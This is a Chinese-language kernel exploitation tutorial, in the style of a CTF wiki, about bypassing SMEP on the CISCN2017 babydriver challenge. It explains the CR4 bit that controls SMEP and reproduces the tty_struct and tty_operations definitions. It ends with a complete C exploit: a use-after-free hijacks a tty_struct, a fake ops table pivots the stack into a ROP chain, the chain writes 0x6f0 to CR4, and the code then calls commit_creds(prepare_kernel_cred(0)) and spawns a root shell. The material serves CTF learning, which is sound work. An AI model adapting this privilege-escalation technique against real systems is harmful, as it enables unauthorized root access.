# bypass-smep
## SMEP 
为了防止 `ret2usr` 攻击，内核开发者提出了 `smep` 保护，smep 全称 `Supervisor Mode Execution Protection`，是内核的一种保护措施，作用是当 CPU 处于 `ring0` 模式时，执行 `用户空间的代码` 会触发页错误；这个保护在 arm 中被称为 `PXN`。

通过 qemu 启动内核时的选项可以判断是否开启了 smep 保护。
```bash
CISCN2017_babydriver [master●●] grep smep ./boot.sh
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep
```

也可以通过
```bash
CISCN2017_babydriver [master●●] grep smep /proc/cpuinfo 
flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap intel_pt xsaveopt dtherm ida arat pln pts
......
```
检测该保护是否开启。

### smep 和 CR4 寄存器
系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。

![](http://ww1.sinaimg.cn/large/006AWYXBly1fvzmqcu1irj30py06egmo.jpg)

例如，当
```
$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000
```
时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要
```asm
mov cr4, 0x1407e0
# 0x1407e0 = 101 0 0000 0011 1111 00000
```
即可关闭 smep 保护。

搜索一下从 `vmlinux` 中提取出的 gadget，很容易就能达到这个目的。

- 如何查看 CR4 寄存器的值？
	- gdb 无法查看 cr4 寄存器的值，可以通过 kernel crash 时的信息查看。为了关闭 smep 保护，常用一个固定值 `0x6f0`，即 `mov cr4, 0x6f0`。

### CISCN2017 - babydriver
之前已经分析过使用 [uaf 改 cred](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf/#ciscn2017-babydriver) 的做法，这次换一种方法，通过关闭 smep 保护和 ret2usr 来提权。

这里选取的方法是先通过 uaf 控制一个 `tty_struct` 结构，在 `open("/dev/ptmx", O_RDWR)` 时会分配这样一个结构体

`tty_struct` 的 [源码](https://code.woboq.org/linux/linux/include/linux/tty.h.html#tty_struct) 如下：
```C
struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
	int index;
	/* Protects ldisc changes: Lock tty not pty */
	struct ld_semaphore ldisc_sem;
	struct tty_ldisc *ldisc;
	struct mutex atomic_write_lock;
	struct mutex legacy_mutex;
	struct mutex throttle_mutex;
	struct rw_semaphore termios_rwsem;
	struct mutex winsize_mutex;
	spinlock_t ctrl_lock;
	spinlock_t flow_lock;
	/* Termios values are protected by the termios rwsem */
	struct ktermios termios, termios_locked;
	struct termiox *termiox;	/* May be NULL for unsupported */
	char name[64];
	struct pid *pgrp;		/* Protected by ctrl lock */
	struct pid *session;
	unsigned long flags;
	int count;
	struct winsize winsize;		/* winsize_mutex */
	unsigned long stopped:1,	/* flow_lock */
		      flow_stopped:1,
		      unused:BITS_PER_LONG - 2;
	int hw_stopped;
	unsigned long ctrl_status:8,	/* ctrl_lock */
		      packet:1,
		      unused_ctrl:BITS_PER_LONG - 9;
	unsigned int receive_room;	/* Bytes free for queue */
	int flow_change;
	struct tty_struct *link;
	struct fasync_struct *fasync;
	wait_queue_head_t write_wait;
	wait_queue_head_t read_wait;
	struct work_struct hangup_work;
	void *disc_data;
	void *driver_data;
	spinlock_t files_lock;		/* protects tty_files list */
	struct list_head tty_files;
#define N_TTY_BUF_SIZE 4096
	int closing;
	unsigned char *write_buf;
	int write_cnt;
	/* If the tty has a pending do_SAK, queue it here - akpm */
	struct work_struct SAK_work;
	struct tty_port *port;
} __randomize_layout;
```

为什么要控制这个结构体呢？因为其中有另一个很有趣的结构体 `tty_operations`，[源码](https://code.woboq.org/linux/linux/include/linux/tty_driver.h.html#tty_operations) 如下：
```C
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
				struct serial_icounter_struct *icount);
	void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
	int (*poll_init)(struct tty_driver *driver, int line, char *options);
	int (*poll_get_char)(struct tty_driver *driver, int line);
	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
	int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```

大把的函数指针（ pwn 手的风水宝地），因此设想构造下图所示结构体
```
fake_tty_struct  fake_tty_operations
+---------+      +----------+
|magic    |  +-->|evil 1    |
+---------+  |   +----------+
|......   |  |   |evil 2    |
|......   |  |   +----------+
+---------+  |   |evil 3    |
|*ops     |--+   +----------+
+---------+      |evil 4    |
|......   |      +----------+
|......   |      |......    |
+---------+      +----------+
```
那么我们就可以通过不同的操作（如 `write, ioctl` 等）来跳转到不同的 evil 了。

对这道题目而言，因为开启了 smep 保护，因此如果想 ret2usr 提权，需要修改 cr4 的值，而控制函数指针是不够的，可以控制函数指针进行 stack pivot 等操作到我们排布 rop 链的空间，通过 rop 关闭 smep，进而进行后续操作。

> 这道题目没给 vmlinux，需要使用 [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) 解压内核镜像。

关闭 smep 保护后，就可以通过 rop 来为所欲为了，最终的 [exp](https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/uaf_tty_struct.c) 如下:
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define prepare_kernel_cred_addr 0xffffffff810a1810
#define commit_creds_addr 0xffffffff810a1420

void* fake_tty_operations[30];

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*]status has been saved.");
}


void get_shell()
{
    system("/bin/sh");
}

void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}
int main()
{
    save_status();

	int i = 0;
    size_t rop[32] = {0};
    rop[i++] = 0xffffffff810d238d;		// pop rdi; ret;
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80;		// mov cr4, rdi; pop rbp; ret;
    rop[i++] = 0;
    rop[i++] = (size_t)get_root;
    rop[i++] = 0xffffffff81063694;		// swapgs; pop rbp; ret;
    rop[i++] = 0;
    rop[i++] = 0xffffffff814e35ef;		// iretq; ret;
    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;                /* saved CS */
    rop[i++] = user_rflags;            /* saved EFLAGS */
    rop[i++] = user_sp;
    rop[i++] = user_ss;

	for(int i = 0; i < 30; i++)
	{
		fake_tty_operations[i] = 0xFFFFFFFF8181BFC5; 
	}
    fake_tty_operations[0] = 0xffffffff810635f5;  //pop rax; pop rbp; ret;
    fake_tty_operations[1] = (size_t)rop;
    fake_tty_operations[3] = 0xFFFFFFFF8181BFC5;  // mov rsp,rax ; dec ebx ; ret

    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);

    int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    size_t fake_tty_struct[4] = {0};
    read(fd2, fake_tty_struct, 32);
    fake_tty_struct[3] = (size_t)fake_tty_operations;
    write(fd2,fake_tty_struct, 32);

    char buf[0x8] = {0};
    write(fd_tty, buf, 8);

    return 0;
}
```
